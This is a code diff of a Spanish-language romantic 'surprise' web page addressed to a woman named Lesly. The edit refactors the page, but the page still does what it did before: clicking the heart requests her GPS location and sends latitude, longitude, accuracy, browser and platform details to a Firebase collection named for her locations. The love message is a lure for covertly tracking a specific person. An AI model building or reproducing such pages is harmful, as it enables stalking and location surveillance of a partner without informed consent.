@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Para Mi Amor Lesly</title>
     
-    <!-- Firebase CDN tradicional (más estable) -->
+    <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     
@@ -309,13 +309,6 @@
             }
         }
 
-        @keyframes explode {
-            to {
-                transform: translate(var(--tx), var(--ty)) scale(0);
-                opacity: 0;
-            }
-        }
-
         @media (max-width: 600px) {
             .mensaje { font-size: 1.8rem; }
             .sub-mensaje { font-size: 1.2rem; }
@@ -339,7 +332,7 @@
         <h1 class="mensaje">Buenas noches mi amor Lesly</h1>
         <p class="sub-mensaje">Tengo una sorpresa para ti</p>
         
-        <div class="heart-container" id="heartBtn" onclick="handleClick()">
+        <div class="heart-container" id="heartBtn">
             <div class="heart"></div>
             <span class="click-text">Clic aquí</span>
         </div>
@@ -355,7 +348,7 @@
     </div>
 
     <div class="love-message" id="loveMessage">
-        Nena guapa preciosa, te deseo lo mejor siempre. 
+        Te amo con todo mi corazón
     </div>
 
     <div class="particles" id="particles"></div>
@@ -387,24 +380,25 @@ const app = initializeApp(firebaseConfig);
 const analytics = getAnalytics(app);
 
         // Función para guardar en Firebase
-        async function saveToFirebase(latitude, longitude, accuracy) {
-            try {
-                await db.collection("ubicaciones_lesly").add({
-                    latitud: latitude,
-                    longitud: longitude,
-                    precision: accuracy,
-                    fecha: firebase.firestore.FieldValue.serverTimestamp(),
-                    mensaje: "Lesly hizo clic en el corazón",
-                    usuario: "Lesly",
-                    userAgent: navigator.userAgent,
-                    plataforma: navigator.platform
-                });
+        function saveToFirebase(latitude, longitude, accuracy) {
+            return db.collection("ubicaciones_lesly").add({
+                latitud: latitude,
+                longitud: longitude,
+                precision: accuracy,
+                fecha: firebase.firestore.FieldValue.serverTimestamp(),
+                mensaje: "Lesly hizo clic en el corazón",
+                usuario: "Lesly",
+                userAgent: navigator.userAgent,
+                plataforma: navigator.platform
+            })
+            .then(() => {
                 console.log("✅ Ubicación guardada en Firebase");
                 return true;
-            } catch (error) {
+            })
+            .catch((error) => {
                 console.error("❌ Error al guardar:", error);
                 return false;
-            }
+            });
         }
 
         // Crear estrellas
@@ -423,7 +417,7 @@ const analytics = getAnalytics(app);
         // Crear partículas
         function createParticles() {
             const particlesContainer = document.getElementById('particles');
-            const heartSymbols = ['❤', '💖', '💕'];
+            const heartSymbols = ['\u2764', '\uD83D\uDC96', '\uD83D\uDC95'];
             
             setInterval(() => {
                 const particle = document.createElement('div');
@@ -437,7 +431,7 @@ const analytics = getAnalytics(app);
         }
 
         // Función principal del clic
-        async function handleClick() {
+        function handleClick() {
             const heartBtn = document.getElementById('heartBtn');
             const loading = document.getElementById('loading');
             const mainContainer = document.getElementById('mainContainer');
@@ -449,24 +443,24 @@ const analytics = getAnalytics(app);
 
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
-                    async (position) => {
+                    function(position) {
                         const lat = position.coords.latitude;
                         const lng = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
 
-                        console.log("📍 Ubicación:", lat, lng);
+                        console.log("📍 Ubicación obtenida:", lat, lng);
                         
                         // Guardar en Firebase
-                        await saveToFirebase(lat, lng, accuracy);
-
-                        // Mostrar sorpresa
-                        loading.classList.remove('active');
-                        mainContainer.style.display = 'none';
-                        bigHeart.classList.add('active');
-                        loveMessage.classList.add('active');
-                        createExplosion();
+                        saveToFirebase(lat, lng, accuracy).then(function() {
+                            // Mostrar sorpresa
+                            loading.classList.remove('active');
+                            mainContainer.style.display = 'none';
+                            bigHeart.classList.add('active');
+                            loveMessage.classList.add('active');
+                            createExplosion();
+                        });
                     },
-                    (error) => {
+                    function(error) {
                         console.error("Error GPS:", error);
                         loading.classList.remove('active');
                         mainContainer.style.display = 'none';
@@ -495,7 +489,7 @@ const analytics = getAnalytics(app);
             const colors = ['#ff006e', '#ff4d6d', '#ff758f', '#ffb3c6', '#fff'];
             
             for (let i = 0; i < 50; i++) {
-                setTimeout(() => {
+                setTimeout(function() {
                     const particle = document.createElement('div');
                     particle.style.position = 'absolute';
                     particle.style.left = '50%';
@@ -521,9 +515,25 @@ const analytics = getAnalytics(app);
             }
         }
 
+        // Agregar animación de explosión dinámicamente
+        const styleSheet = document.createElement('style');
+        styleSheet.textContent = `
+            @keyframes explode {
+                to {
+                    transform: translate(var(--tx), var(--ty)) scale(0);
+                    opacity: 0;
+                }
+            }
+        `;
+        document.head.appendChild(styleSheet);
+
+        // Asignar evento de clic al corazón
+        document.getElementById('heartBtn').addEventListener('click', handleClick);
+
         // Inicializar
         createStars();
         createParticles();
+        console.log("💖 Sorpresa para Lesly cargada correctamente");
     </script>
 </body>
 </html>
